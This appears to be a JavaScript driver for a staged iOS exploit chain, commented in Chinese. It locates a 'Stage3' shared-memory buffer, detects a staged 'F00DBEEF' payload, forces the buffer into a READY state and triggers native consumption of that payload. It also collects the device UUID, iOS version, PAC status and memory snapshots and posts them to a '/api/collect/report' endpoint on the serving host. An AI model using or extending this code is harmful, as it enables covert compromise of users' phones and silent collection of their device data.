/**
 * real_bridge.js v8 — 主动驱动 stock bootstrap 共享内存链
 *
 * 协议：
 *   D0=0 IDLE  + size>0 + F00D → 置 READY(3) + kick _process
 *   D0=1 URL   → Stage3 wA 下载
 *   D0=2 DL
 *   D0=3 READY → kick _process 消费；上报快照
 *   D0=7 POST  → Stage3 TA 改写到 /api/collect/report
 *   D0=4 ERROR / D0=5 EXIT → 上报
 *
 * 不写 cmd:/FEED=6（与 Stage3 TA 冲突）。
 * 重入只走 __stage3KickProcess（不清空缓冲）。
 */
(function () {
    "use strict";

    var S = { IDLE: 0, URL: 1, DL: 2, READY: 3, ERROR: 4, EXIT: 5, TA: 6, POST: 7 };
    var _started = false;
    var _deviceUuid = "";
    var _d = null;
    var _u8 = null;
    var _timer = null;
    var _lastKey = "";
    var _lastD0 = -1;
    var _ticks = 0;
    var _kickCount = 0;
    var _lastKickAt = 0;
    var _lastKickKey = "";
    var _f00dConsumed = false;

    function log(m) {
        try {
            if (window.log) window.log("[SHARED] " + m);
            else console.log("[SHARED] " + m);
        } catch (e) {}
    }

    function nameD0(n) {
        return ({ 0: "IDLE", 1: "URL", 2: "DL", 3: "READY", 4: "ERROR", 5: "EXIT", 6: "TA", 7: "POST" })[n] || ("?" + n);
    }

    function getBuffer() {
        function pick(x) {
            if (!x) return null;
            if (x instanceof Uint32Array) return x;
            if (x.buffer instanceof Uint32Array) return x.buffer;
            if (x.D instanceof Uint32Array) return x.D;
            return null;
        }
        var cands = [
            window.__stage3Buffer,
            window.__stage3Ctrl && window.__stage3Ctrl.buffer,
            window.__stage3Ctrl && window.__stage3Ctrl.D
        ];
        try {
            var pm = window.platformModule;
            if (!pm && window.globalThis && window.globalThis.moduleManager) {
                pm = window.globalThis.moduleManager.getModuleByName(
                    "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                );
            }
            if (pm && pm.platformState) {
                cands.push(pm.platformState.sharedBuffer);
                cands.push(pm.platformState.stage3Ctrl && pm.platformState.stage3Ctrl.buffer);
            }
        } catch (e) {}
        for (var i = 0; i < cands.length; i++) {
            var p = pick(cands[i]);
            if (p) return p;
        }
        return null;
    }

    function attach() {
        var buf = getBuffer();
        if (!buf) return false;
        _d = buf;
        _u8 = new Uint8Array(buf.buffer, buf.byteOffset, buf.byteLength);
        return true;
    }

    function readBytes(maxLen) {
        if (!_d || !_u8) return new Uint8Array(0);
        var size = _d[1] >>> 0;
        if (size <= 0) return new Uint8Array(0);
        if (size > _u8.length - 8) size = _u8.length - 8;
        if (maxLen && size > maxLen) size = maxLen;
        return _u8.subarray(8, 8 + size);
    }

    function readCString() {
        var bytes = readBytes(65536);
        var out = "";
        for (var i = 0; i < bytes.length; i++) {
            if (!bytes[i]) break;
            out += String.fromCharCode(bytes[i]);
        }
        return out;
    }

    function parseF00D(bytes) {
        if (!bytes || bytes.length < 8) return null;
        if (bytes[0] !== 0xef || bytes[1] !== 0xbe || bytes[2] !== 0x0d || bytes[3] !== 0xf0) {
            return null;
        }
        var n = bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24);
        var entries = [];
        for (var i = 0; i < n && i < 32; i++) {
            var off = 8 + i * 16;
            if (off + 16 > bytes.length) break;
            var f1 = bytes[off] | (bytes[off + 1] << 8) | (bytes[off + 2] << 16) | (bytes[off + 3] << 24);
            var f2 = bytes[off + 4] | (bytes[off + 5] << 8) | (bytes[off + 6] << 16) | (bytes[off + 7] << 24);
            var dataOff = bytes[off + 8] | (bytes[off + 9] << 8) | (bytes[off + 10] << 16) | (bytes[off + 11] << 24);
            var dataSz = bytes[off + 12] | (bytes[off + 13] << 8) | (bytes[off + 14] << 16) | (bytes[off + 15] << 24);
            entries.push({
                index: i,
                type: (f1 >>> 16) & 0xffff,
                f1: f1 >>> 0,
                f2: f2 >>> 0,
                dataOff: dataOff >>> 0,
                dataSize: dataSz >>> 0
            });
        }
        return { magic: "F00DBEEF", entryCount: n >>> 0, entries: entries, totalBytes: bytes.length };
    }

    function hasF00D() {
        if (!_d || !_u8) return false;
        var size = _d[1] >>> 0;
        if (size < 8) return false;
        return _u8[8] === 0xef && _u8[9] === 0xbe && _u8[10] === 0x0d && _u8[11] === 0xf0;
    }

    function postCollect(category, payload) {
        var base = window.location.protocol + "//" + window.location.host;
        return fetch(base + "/api/collect/report", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                device_uuid: _deviceUuid || window.__deviceUuid || "unknown",
                category: category,
                data_key: category,
                payload: payload,
                source: "bootstrap_sharedmem",
                collected_at: new Date().toISOString()
            }),
            keepalive: true
        }).then(function (r) {
            log("collect " + category + " => " + r.status);
            return r.json().catch(function () { return {}; });
        }).catch(function (e) {
            log("collect err " + e.message);
        });
    }

    function iosInfo() {
        try {
            var pm = window.platformModule;
            if (pm && pm.platformState) {
                return {
                    ios: pm.platformState.iOSVersion,
                    pac: pm.platformState.hasPAC,
                    runtime: pm.platformState.runtime
                };
            }
        } catch (e) {}
        return {};
    }

    function reportBufferSnapshot(reason) {
        if (!_d) return;
        var size = _d[1] >>> 0;
        var d0 = _d[0] >>> 0;
        var key = d0 + ":" + size + ":" + reason;
        if (key === _lastKey) return;
        _lastKey = key;

        var bytes = readBytes(Math.min(size, 256 * 1024));
        var f00d = parseF00D(bytes);
        var cstr = readCString();
        var info = iosInfo();

        var payload = {
            reason: reason,
            d0: d0,
            d0_name: nameD0(d0),
            size: size,
            ios: info.ios || null,
            pac: info.pac,
            f00d: f00d,
            text_preview: cstr ? cstr.slice(0, 300) : "",
            hex_head: (function () {
                var h = "";
                var n = Math.min(bytes.length, 64);
                for (var i = 0; i < n; i++) {
                    var x = bytes[i].toString(16);
                    if (x.length < 2) x = "0" + x;
                    h += x;
                }
                return h;
            })()
        };
        log("snapshot " + reason + " D0=" + d0 + " size=" + size +
            (f00d ? (" F00D entries=" + f00d.entryCount) : ""));
        postCollect("sharedmem_snapshot", payload);
    }

    function ensureCtrl() {
        try {
            if (window.__stage3Ctrl && typeof window.__stage3Ctrl.start === "function") {
                window.__stage3Ctrl.start();
            }
        } catch (e) {}
    }

    function sizeSane(size) {
        // 拒绝 URL 态垃圾 size（曾见 1886680168）
        return size > 8 && size < 0x1000000 && size < (_u8 ? _u8.length - 8 : 0x1000000);
    }

    function kick(reason) {
        var now = Date.now();
        var d0 = _d ? (_d[0] >>> 0) : -1;
        var size = _d ? (_d[1] >>> 0) : -1;
        // 禁止在 URL/DL/POST 中 kick
        if (d0 === S.URL || d0 === S.DL || d0 === S.POST || d0 === S.TA) {
            ensureCtrl();
            return false;
        }
        if (!sizeSane(size)) {
            log("kick skip insane size=" + size + " d0=" + d0);
            return false;
        }
        var key = reason + ":" + d0 + ":" + size;
        if (key === _lastKickKey && now - _lastKickAt < 1500) return false;
        if (_kickCount >= 24) {
            if (_kickCount === 24) log("kick cap reached");
            _kickCount++;
            return false;
        }
        _lastKickKey = key;
        _lastKickAt = now;
        _kickCount++;

        ensureCtrl();

        if (typeof window.__stage3KickProcess === "function") {
            log("kick via __stage3KickProcess #" + _kickCount + " " + reason);
            return !!window.__stage3KickProcess(reason);
        }
        if (typeof window.__stage3Reenter === "function") {
            log("kick via __stage3Reenter #" + _kickCount + " " + reason);
            return !!window.__stage3Reenter();
        }
        log("kick unavailable reason=" + reason);
        return false;
    }

    function drive() {
        if (!_d && !attach()) return;
        var d0 = _d[0] >>> 0;
        var size = _d[1] >>> 0;
        var f00d = hasF00D();

        // URL/DL/POST：只保活 wA，绝不 kick
        if (d0 === S.URL || d0 === S.DL || d0 === S.POST || d0 === S.TA) {
            ensureCtrl();
            return;
        }

        if (!sizeSane(size)) {
            return;
        }

        // 核心：IDLE + F00DBEEF 未消费 → READY + kick
        if (d0 === S.IDLE && f00d && !_f00dConsumed) {
            log("drive IDLE+F00D → READY size=" + size);
            _d[0] = S.READY;
            reportBufferSnapshot("drive_force_ready");
            kick("idle-f00d");
            return;
        }

        // READY + F00D：让 native 消费
        if (d0 === S.READY && f00d) {
            kick("ready-f00d");
            return;
        }

        // READY 非 F00D：结果包，只上报，轻 kick 一次
        if (d0 === S.READY && size > 100 && !f00d) {
            reportBufferSnapshot("ready_result");
            return;
        }

        // 包被消费：size 变小或 magic 消失
        if (_f00dConsumed === false && size < 100) {
            _f00dConsumed = true;
            log("payload likely consumed size=" + size);
            reportBufferSnapshot("consumed");
        }
        if (d0 === S.IDLE && size > 100 && !f00d) {
            reportBufferSnapshot("idle_text");
        }
    }

    function tick() {
        _ticks++;
        if (!_d && !attach()) return;

        var d0 = _d[0] >>> 0;
        var size = _d[1] >>> 0;

        if (d0 !== _lastD0) {
            log("D0 " + _lastD0 + "→" + d0 + " (" + nameD0(d0) + ") size=" + size);
            _lastD0 = d0;
            reportBufferSnapshot("state_change");
            // 状态变化时立刻推进
            drive();
        } else {
            // 稳态也定期推进（处理异步喂包）
            if (_ticks % 2 === 0) drive();
        }

        if (d0 === S.READY && size > 0) {
            reportBufferSnapshot("ready");
        }
        if (d0 === S.ERROR) {
            reportBufferSnapshot("error");
        }
        if (d0 === S.EXIT) {
            reportBufferSnapshot("exit");
        }

        if (_ticks % 10 === 1) ensureCtrl();
    }

    function start(opts) {
        if (_started) return;
        _started = true;
        opts = opts || {};
        _deviceUuid = opts.deviceUuid || opts.device_uuid || window.__deviceUuid || "";
        try {
            if (!window.platformModule && window.globalThis && window.globalThis.moduleManager) {
                window.platformModule = window.globalThis.moduleManager.getModuleByName(
                    "14669ca3b1519ba2a8f40be287f646d4d7593eb0"
                );
            }
        } catch (e) {}

        log("start ACTIVE bootstrap chain device=" + _deviceUuid);

        ensureCtrl();

        var tries = 0;
        function boot() {
            tries++;
            if (attach()) {
                log("attached bytes=" + _u8.length + " D0=" + (_d[0] >>> 0) + " size=" + (_d[1] >>> 0));
                reportBufferSnapshot("boot");
                postCollect("chain_meta", {
                    ok: true,
                    mode: "bootstrap_active_driver_v8",
                    ios: iosInfo().ios,
                    pac: iosInfo().pac,
                    d0: _d[0] >>> 0,
                    size: _d[1] >>> 0,
                    note: "force READY+kick on IDLE F00DBEEF; no FEED"
                });
                // 立刻推进一次（覆盖你当前日志卡点）
                drive();
                _timer = setInterval(tick, 500);
            } else if (tries < 80) {
                setTimeout(boot, 200);
            } else {
                log("attach failed");
            }
        }
        setTimeout(boot, 100);
    }

    function stop() {
        if (_timer) clearInterval(_timer);
        _timer = null;
        _started = false;
    }

    window.RealBridge = {
        start: start,
        stop: stop,
        attach: attach,
        kick: kick,
        drive: drive,
        writeFeed: function () {
            log("writeFeed disabled — use stock bootstrap URL/POST only");
            return false;
        },
        reenterIfNeeded: function () {
            return kick("manual-reenter");
        }
    };

    if (window.__REAL_BRIDGE_AUTO__) {
        try { start({ deviceUuid: window.__deviceUuid || "" }); } catch (e) {}
    }
})();
